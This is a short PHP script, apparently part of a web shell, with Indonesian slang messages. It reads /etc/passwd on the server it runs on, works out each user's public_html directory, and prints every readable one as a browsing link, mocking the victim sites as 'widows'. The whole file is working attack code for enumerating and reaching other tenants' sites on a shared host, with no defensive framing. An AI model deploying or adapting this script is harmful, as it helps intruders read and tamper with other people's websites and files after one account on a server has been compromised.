<?php

set_time_limit(0); @$passwd = fopen('/etc/passwd','r'); if (!$passwd) { die('<b>ORA KENEK COK ORAISO MOCO /etc/passwd </b>'); } $pub = array(); $users = array(); $conf = array(); $i = 0; while(!feof($passwd)) { $str = fgets($passwd); if ($i > 10) { $pos = strpos($str,':'); $username = substr($str,0,$pos); $dirz = '/home/'.$username.'/public_html/'; if (($username != '')) { if (is_readable($dirz)) { array_push($users,$username); array_push($pub,$dirz); } } } $i++; } echo '<br>'; echo "<center><b> ^_^ <br> SELAMAT NGINTIP <br> TERNYATA DISINI ADA ".sizeof($pub)." JANDA "." </b><br/><br/>"; foreach ($users as $user) { $path = "/home/$user/public_html/"; echo "<a href='?d=$path' target='_blank' style='font-weight:bold; color:#;'>$path</a><br>"; } echo "<br>"; echo '</div></center></body></html>';


?>
